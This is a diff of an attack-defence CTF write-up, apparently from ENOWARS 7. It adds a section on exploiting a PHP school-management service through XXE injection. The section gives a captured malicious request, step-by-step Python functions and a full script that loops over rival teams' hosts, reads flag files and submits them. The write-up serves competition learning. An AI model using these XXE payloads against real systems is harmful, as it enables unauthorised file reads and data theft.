@@ -118,8 +118,9 @@ router.post('/', async (req, res) => {
             res.status(400).send('Room Name must be a string')
             return
         }
-
-...
+	...
+	}
+}
 ```
 
 Since we know the room's name already, we can generate the ID again ourselves by re-generating the hash.
@@ -167,7 +168,7 @@ s = None
 
 TIMEOUT = 4
 
-BLACKLIST = []
+BLOCKLIST = []
 
 def create_account(username, endpoint=None):
     data = {
@@ -280,7 +281,7 @@ def main():
 
             for team in team_data["availableTeams"]:
                 try:
-                    if team in BLACKLIST:
+                    if team in BLOCKLIST:
                         continue
 
                     print(f"Pwning {team}")
@@ -306,4 +307,225 @@ if __name__ == "__main__":
 # oldschool
 **Category: Web**
 
-This service was another web service running under Docker. It was written in PHP, a language I am less confident with, and was running on the port `9080`.
+This service was another web service running under Docker. It was written in PHP, a language I am less confident with, and was running on the port `9080`. This service was meant to replicate a school management system, allowing students to enrol in courses and view their grades.
+
+![[../Files/Pasted image 20230722223104.png]]
+
+Our discovery of one of the exploits was not found by reviewing the source code. Instead, we found a malicious HTTP payload in a packet capture we had running on our vulnbox. The response to the request had one of our flags, so we knew this was a valid exploit.
+
+The HTTP request looked like the following:
+
+```http
+POST /?action=courses
+HTTP/1.1 Host: 10.1.28.1:9080
+User-Agent: python-requests/2.31.0 Accept-Encoding: gzip, deflate Accept: */* Connection: keep-alive
+Cookie: PHPSESSID=415bd8c31ad93129a1cd5ffbed956105
+Content-Length: 513
+Content-Type: multipart/form-data; boundary=7a9bf3531b4f35a4f2f3cf4f0865b2e3
+
+--7a9bf3531b4f35a4f2f3cf4f0865b2e3
+Content-Disposition: form-data; name="is_private"
+
+on
+--7a9bf3531b4f35a4f2f3cf4f0865b2e3
+Content-Disposition: form-data; name="title" 
+
+RAAYBG
+--7a9bf3531b4f35a4f2f3cf4f0865b2e3 Content-Disposition: form-data; name="EFsfa.xml"; filename="EFsfa.xml"
+
+<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///service/grades/68518_9756b1161f58cb5c1dd67633666c6674" >]><data>&xxe;</data>
+--7a9bf3531b4f35a4f2f3cf4f0865b2e3--
+```
+
+What's interesting here is the XML file that was being uploaded. It looked like they were exploiting an XXE injection, which allows misconfigured XML parsers to view files on the filesystem. In the attacker's case, they were reading the contents of the file at `/service/grades/68518_9756b1161f58cb5c1dd67633666c6674`.
+
+Looking at this we did what any good hacker would do, so we stole it.
+
+The "Courses" page allowed you to upload an XML file which was meant to contain course data, so this was the likely vector for our injection.
+
+> [!Todo]
+> Our goal was split into three parts:
+> 1. Create a new user account
+> 2. Create a new course with a malicious XML file
+> 3. Get the flag from the course data
+
+## Creating a new user
+Creating a new user required us to send a POST request to `/index.php?action=register`.
+
+```python
+def create_account(username, endpoint=None):
+    data = {
+        "username": username,
+        "password": username
+    }
+
+    print(f"Creating account {username}... ", end="")
+    r = s.post(f"{endpoint}?action=register", data=data, timeout=TIMEOUT)
+    print(r.status_code)
+```
+
+## Creating a course with the XXE injection
+The flag was indicated to be in a file on the filesystem. In this case, those paths were given by the CTF organisers on each tick, so we already knew where to look.
+
+It was a matter of making a POST to the `/index.php?action=courses` endpoint that contained multipart form-data that included our course details and our malicious XML payload.
+
+```python
+def upload_xxe(grade_file, endpoint=None):
+    files = {
+        "course_data": ("test.xml", f"""<?xml version='1.0' encoding='UTF-8'?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///service/grades/{grade_file}"
+ >]><data><course><name>&xxe;</name></course></data>""", "text/xml"),
+        "title": (None, "testa", None),
+        "is_private": (None, "on", None)
+    }
+
+    print(f"Uploading course data with {grade_file}... ", end="")
+    r = s.post(f"{endpoint}?action=courses", files=files, timeout=TIMEOUT)
+    print(r.status_code)
+
+    i1 = r.text.find("Course added successfully with ID:") + 35
+    i2 = r.text.find("</p>", i1)
+
+    course_id = r.text[i1:i2]
+
+    return course_id
+```
+
+## Getting the flag from course data
+Our XML payload set the contents of the flag's file to be the name of the course. This means that all we have to do is go back to the main course page and view all of the courses our use is associated with. This can be done with a GET request to `index.php?action=courses`.
+
+```python
+def get_flag(course_id, endpoint=None):
+    print(f"Getting flag... ", end="")
+    r = s.get(f"{endpoint}?action=courses", params={"id": course_id}, timeout=TIMEOUT)
+    print(r.status_code)
+
+    i1 = r.text.find("<course><name>") + 14
+    i2 = r.text.find("</name></course>", i1)
+
+    flag = r.text[i1:i2]
+
+    if "ENO" in flag:
+        return flag
+
+    return None
+```
+
+> [!Success}
+> And that's all there is to it! After uploading the malicious XML file, the contents of the file were read and the flag was set as the course's name! We solved this exploit near the end of the CTF, so we weren't able to steal as many flags from other teams. Regardless, I'm glad we got a working exploit!
+
+Here's the final script we used to continually run the exploit against all the other vulnboxes:
+
+```python
+import requests
+import uuid
+
+from pushflag import submit_flag
+from bs4 import BeautifulSoup
+
+TIMEOUT = 4
+
+BLOCKLIST = []
+
+s = None
+
+def create_account(username, endpoint=None):
+    data = {
+        "username": username,
+        "password": username
+    }
+
+    print(f"Creating account {username}... ", end="")
+    r = s.post(f"{endpoint}?action=register", data=data, timeout=TIMEOUT)
+    print(r.status_code)
+
+def upload_xxe(grade_file, endpoint=None):
+    files = {
+        "course_data": ("test.xml", f"""<?xml version='1.0' encoding='UTF-8'?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///service/grades/{grade_file}" >]><data><course><name>&xxe;</name></course></data>""", "text/xml"),
+        "title": (None, "testa", None),
+        "is_private": (None, "on", None)
+    }
+
+    print(f"Uploading course data with {grade_file}... ", end="")
+    r = s.post(f"{endpoint}?action=courses", files=files, timeout=TIMEOUT)
+    print(r.status_code)
+
+    i1 = r.text.find("Course added successfully with ID:") + 35
+    i2 = r.text.find("</p>", i1)
+
+    course_id = r.text[i1:i2]
+
+    return course_id
+
+def get_flag(course_id, endpoint=None):
+    print(f"Getting flag... ", end="")
+    r = s.get(f"{endpoint}?action=courses", params={"id": course_id}, timeout=TIMEOUT)
+    print(r.status_code)
+
+    i1 = r.text.find("<course><name>") + 14
+    i2 = r.text.find("</name></course>", i1)
+
+    flag = r.text[i1:i2]
+
+    if "ENO" in flag:
+        return flag
+
+    return None
+
+def pwn(ip, grade_file):
+    global s
+
+    endpoint = f"http://{ip}:9080"
+
+    s = requests.Session()
+    username = uuid.uuid4()
+
+    create_account(username, endpoint=endpoint)
+    course_id = upload_xxe(grade_file, endpoint=endpoint)
+    flag = get_flag(course_id, endpoint=endpoint)
+
+    if flag:
+        print(f"Flag: {flag}")
+        response = submit_flag(f"{flag}", "10.0.13.37", 1337)
+        print(f"Flag submitted: {response}")
+
+    else:
+        print("No flag!")
+
+def get_all_teams():
+    j = requests.get("https://7.enowars.com/scoreboard/attack.json", timeout=TIMEOUT).json()
+
+    return j
+
+def main():
+    while True:
+        try:
+            team_data = get_all_teams()
+
+            for team in team_data["availableTeams"]:
+                try:
+                    if team in BLOCKLIST:
+                        continue
+
+                    print(f"Pwning {team}")
+
+                    data = team_data["services"]["oldschool"][team]
+
+                    latest_tick = sorted(list(data.keys()))[-1]
+
+                    grade_file = data[latest_tick]["1"][0]
+                    grade_file = grade_file[grade_file.find("Grade") + 6:]
+
+                    pwn(team, grade_file)
+
+                except Exception as e:
+                    print(e)
+
+                print("=" * 64)
+                print()
+
+        except Exception as e:
+            print(e)
+
+if __name__ == "__main__":
+    main()
+```
